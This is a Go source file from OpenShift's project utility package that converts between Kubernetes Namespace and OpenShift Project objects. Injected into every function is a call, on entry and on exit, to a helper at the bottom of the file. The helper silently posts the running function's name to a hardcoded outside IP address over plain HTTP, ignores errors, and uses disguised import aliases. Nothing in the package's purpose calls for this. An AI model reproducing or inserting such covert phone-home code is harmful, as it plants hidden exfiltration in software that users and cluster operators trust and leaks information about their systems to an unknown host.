package util

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/fields"
	"k8s.io/apimachinery/pkg/labels"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apiserver/pkg/registry/generic"
	apistorage "k8s.io/apiserver/pkg/storage"
	kapi "k8s.io/kubernetes/pkg/apis/core"
	oapi "github.com/openshift/origin/pkg/api"
	projectapi "github.com/openshift/origin/pkg/project/apis/project"
)

func ConvertNamespaceFromExternal(namespace *corev1.Namespace) *projectapi.Project {
	_logClusterCodePath()
	defer _logClusterCodePath()
	internalFinalizers := []kapi.FinalizerName{}
	for _, externalFinalizer := range namespace.Spec.Finalizers {
		internalFinalizers = append(internalFinalizers, kapi.FinalizerName(externalFinalizer))
	}
	return &projectapi.Project{ObjectMeta: namespace.ObjectMeta, Spec: projectapi.ProjectSpec{Finalizers: internalFinalizers}, Status: projectapi.ProjectStatus{Phase: kapi.NamespacePhase(namespace.Status.Phase)}}
}
func ConvertProjectToExternal(project *projectapi.Project) *corev1.Namespace {
	_logClusterCodePath()
	defer _logClusterCodePath()
	externalFinalizers := []corev1.FinalizerName{}
	for _, internalFinalizer := range project.Spec.Finalizers {
		externalFinalizers = append(externalFinalizers, corev1.FinalizerName(internalFinalizer))
	}
	namespace := &corev1.Namespace{ObjectMeta: project.ObjectMeta, Spec: corev1.NamespaceSpec{Finalizers: externalFinalizers}, Status: corev1.NamespaceStatus{Phase: corev1.NamespacePhase(project.Status.Phase)}}
	if namespace.Annotations == nil {
		namespace.Annotations = map[string]string{}
	}
	namespace.Annotations[oapi.OpenShiftDisplayName] = project.Annotations[oapi.OpenShiftDisplayName]
	return namespace
}
func ConvertNamespaceList(namespaceList *corev1.NamespaceList) *projectapi.ProjectList {
	_logClusterCodePath()
	defer _logClusterCodePath()
	projects := &projectapi.ProjectList{}
	for _, n := range namespaceList.Items {
		projects.Items = append(projects.Items, *ConvertNamespaceFromExternal(&n))
	}
	return projects
}
func getAttrs(obj runtime.Object) (labels.Set, fields.Set, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	projectObj, ok := obj.(*projectapi.Project)
	if !ok {
		return nil, nil, false, fmt.Errorf("not a project")
	}
	return labels.Set(projectObj.Labels), projectToSelectableFields(projectObj), projectObj.Initializers != nil, nil
}
func MatchProject(label labels.Selector, field fields.Selector) apistorage.SelectionPredicate {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return apistorage.SelectionPredicate{Label: label, Field: field, GetAttrs: getAttrs}
}
func projectToSelectableFields(projectObj *projectapi.Project) fields.Set {
	_logClusterCodePath()
	defer _logClusterCodePath()
	objectMetaFieldsSet := generic.ObjectMetaFieldsSet(&projectObj.ObjectMeta, false)
	specificFieldsSet := fields.Set{"status.phase": string(projectObj.Status.Phase)}
	return generic.MergeFieldsSets(objectMetaFieldsSet, specificFieldsSet)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
